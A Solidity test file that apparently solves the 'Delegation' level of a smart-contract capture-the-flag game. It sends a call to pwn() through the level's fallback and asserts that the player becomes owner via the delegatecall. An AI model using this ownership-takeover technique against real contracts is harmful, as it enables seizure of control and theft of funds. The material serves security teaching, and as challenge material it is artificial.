// SPDX-License-Identifier: Unlicense
pragma solidity =0.8.23;

import {Tests} from "../core/Tests.sol";
import {DelegationFactory, Delegation} from "../levels/06_Delegation/DelegationFactory.sol";

contract TestDelegation is Tests {
    Delegation private level;

    /* =============================== SETUP&ATTACK =============================== */

    constructor() {
        levelFactory = new DelegationFactory();
    }

    function setupLevel() internal override {
        levelAddress = payable(this.createLevelInstance());
        level = Delegation(levelAddress);
    }

    function attack() internal override {
        vm.startPrank(PLAYER);

        (bool ok,) = address(level).call(abi.encodeWithSignature("pwn()"));
        assertTrue(ok);
        assertEq(level.owner(), PLAYER);

        vm.stopPrank();
    }

    /* =============================== TEST LEVEL =============================== */

    function testLevel() external {
        runLevel();
    }
}
